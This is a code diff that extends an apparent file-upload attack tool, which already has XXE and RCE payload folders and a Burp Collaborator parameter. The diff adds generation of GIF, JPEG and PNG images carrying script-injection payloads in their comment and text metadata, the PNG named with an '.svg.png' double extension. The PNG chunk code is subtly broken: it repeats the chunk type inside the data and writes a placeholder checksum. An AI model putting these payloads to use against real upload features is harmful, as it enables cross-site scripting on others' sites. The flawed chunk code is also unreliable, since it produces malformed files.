@@ -13,6 +13,8 @@ def generate_image_payloads(output_dir, ext, burp_collab):
     xxe_dir.mkdir(exist_ok=True)
     rce_dir = output_dir / 'rce'
     rce_dir.mkdir(exist_ok=True)
+    xss_dir = output_dir / 'xss'
+    xss_dir.mkdir(exist_ok=True)
     
     if ext == 'png':
         img = Image.new('RGB', (100, 100), color='red')
@@ -244,3 +246,55 @@ pop graphic-context'''.encode('utf-8')
         gif_content = gif_header + comment_chunk + gif_trailer
         with open(output_dir / "master.gif", 'wb') as f:
             f.write(gif_content)
+        
+        comment_extension_xss = b'\x21\xFE'
+        comment_payload_xss = b'<script>alert(1)</script>'
+        comment_length_xss = bytes([min(len(comment_payload_xss), 255)])
+        comment_chunk_xss = comment_extension_xss + comment_length_xss + comment_payload_xss + b'\x00'
+        
+        gif_content_xss = gif_header + comment_chunk_xss + gif_trailer
+        with open(xss_dir / "xss1_comment.gif", 'wb') as f:
+            f.write(gif_content_xss)
+    
+    if ext == 'jpg' or ext == 'jpeg':
+        img = Image.new('RGB', (100, 100), color='red')
+        img_path = xss_dir / "xss1_com.jpg"
+        img.save(img_path, 'JPEG')
+        
+        with open(img_path, 'rb') as f:
+            jpg_data = bytearray(f.read())
+        
+        com_marker = b'\xFF\xFE'
+        com_payload = b'<script>alert(1)</script>'
+        com_length = struct.pack('>H', len(com_payload) + 2)
+        com_chunk = com_marker + com_length + com_payload
+        
+        soi_pos = jpg_data.find(b'\xFF\xD8')
+        if soi_pos != -1:
+            insert_pos = soi_pos + 2
+            jpg_data[insert_pos:insert_pos] = com_chunk
+        
+        with open(img_path, 'wb') as f:
+            f.write(jpg_data)
+    
+    if ext == 'png':
+        img = Image.new('RGB', (100, 100), color='red')
+        img_path = xss_dir / "xss1_itxt.svg.png"
+        img.save(img_path, 'PNG')
+        
+        with open(img_path, 'rb') as f:
+            png_data = bytearray(f.read())
+        
+        iTXt_chunk = f'iTXt\x00\x00<svg onload=alert(1)>'.encode('utf-8')
+        iTXt_length = struct.pack('>I', len(iTXt_chunk))
+        iTXt_type = b'iTXt'
+        iTXt_crc = struct.pack('>I', 0x12345678)
+        
+        iend_pos = png_data.rfind(b'IEND')
+        if iend_pos != -1:
+            iend_chunk_start = iend_pos - 4
+            new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
+            png_data[iend_chunk_start:iend_chunk_start] = new_chunk
+        
+        with open(img_path, 'wb') as f:
+            f.write(png_data)
